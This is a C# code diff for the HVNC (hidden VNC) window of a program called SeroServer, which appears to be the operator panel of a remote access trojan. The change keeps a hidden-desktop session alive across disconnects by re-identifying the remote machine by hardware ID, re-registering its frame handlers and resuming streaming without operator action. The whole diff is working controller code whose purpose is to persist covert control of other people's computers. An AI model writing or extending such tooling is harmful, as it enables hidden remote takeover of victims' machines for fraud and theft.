@@ -12,7 +12,11 @@ namespace SeroServer.UI;
 public partial class HvncWindow : Window
 {
     private readonly TlsServer _server;
-    private readonly string _clientId;
+    private string _clientId;
+    private readonly string _hwid;
+    private System.Windows.Threading.DispatcherTimer? _reconnectTimer;
+    private int _reconnectCountdown;
+    private bool _wasStreaming;
     private volatile bool _closed, _streaming;
     private int _frameCount;
     private DateTime _fpsTime = DateTime.UtcNow;
@@ -43,6 +47,7 @@ public partial class HvncWindow : Window
     {
         _server   = server;
         _clientId = clientId;
+        _hwid     = server.ConnectedClients.TryGetValue(clientId, out var cc) ? cc.Hwid : string.Empty;
         InitializeComponent();
         WindowResizer.Enable(this);
 
@@ -56,13 +61,16 @@ public partial class HvncWindow : Window
         _server.RegisterHandler(clientId, PacketType.HvncProgress,
             pkt => OnHvncProgress(pkt.Data));
         _server.ClientDisconnected += OnClientDisconnected;
+        _server.ClientConnected += OnClientConnected;
         Closed += (_, _) =>
         {
             _closed = true;
+            _reconnectTimer?.Stop();
             _clipTimer?.Stop(); _clipTimer = null;
-            _server.UnregisterHandler(clientId, PacketType.HvncFrame);
-            _server.UnregisterHandler(clientId, PacketType.HvncProgress);
+            _server.UnregisterHandler(_clientId, PacketType.HvncFrame);
+            _server.UnregisterHandler(_clientId, PacketType.HvncProgress);
             _server.ClientDisconnected -= OnClientDisconnected;
+            _server.ClientConnected -= OnClientConnected;
             if (_streaming) SendStop();
         };
 
@@ -375,7 +383,64 @@ public partial class HvncWindow : Window
     private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
     {
         if (c.Id != _clientId) return;
-        Dispatcher.BeginInvoke(Close);
+        Dispatcher.BeginInvoke(() =>
+        {
+            _wasStreaming = _streaming;
+            if (_streaming) SetStreamingState(false);
+            _reconnectCountdown = 60;
+            TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+            ReconnectOverlay.Visibility = Visibility.Visible;
+            ServerWindow.ReportGlobalActivity("⚡ Connection lost", _clientId, "failed");
+
+            _reconnectTimer?.Stop();
+            _reconnectTimer = new System.Windows.Threading.DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
+            _reconnectTimer.Tick += (_, _) =>
+            {
+                _reconnectCountdown--;
+                TxtReconnectCountdown.Text = $"Reconnecting... ({_reconnectCountdown}s)";
+                if (_reconnectCountdown <= 0)
+                {
+                    _reconnectTimer.Stop();
+                    ServerWindow.ReportGlobalActivity("✗ Reconnect timeout", _hwid.Length > 8 ? _hwid[..8] : _hwid, "failed");
+                    Close();
+                }
+            };
+            _reconnectTimer.Start();
+        });
+    }
+
+    private void OnClientConnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (string.IsNullOrEmpty(_hwid) || c.Hwid != _hwid) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            if (_closed) return;
+            var oldId = _clientId;
+            _clientId = c.Id;
+
+            // Re-register per-client packet handlers on the new client ID
+            _server.UnregisterHandler(oldId, PacketType.HvncFrame);
+            _server.UnregisterHandler(oldId, PacketType.HvncProgress);
+            _server.RegisterHandler(_clientId, PacketType.HvncFrame,
+                pkt => OnHvncFrame(_clientId, pkt.Data));
+            _server.RegisterHandler(_clientId, PacketType.HvncProgress,
+                pkt => OnHvncProgress(pkt.Data));
+
+            // Hide overlay, cancel timer
+            _reconnectTimer?.Stop();
+            ReconnectOverlay.Visibility = Visibility.Collapsed;
+
+            // Update UI
+            TxtClientId.Text = $"[ {_clientId} ]";
+            ServerWindow.ReportGlobalActivity("✓ Reconnected (HVNC)", _clientId, "complete");
+
+            // Auto-resume streaming if it was active before disconnect
+            if (_wasStreaming)
+            {
+                _wasStreaming = false;
+                SendStart();
+            }
+        });
     }
 
     private void BtnStart_Click(object s, RoutedEventArgs e) => SendStart();
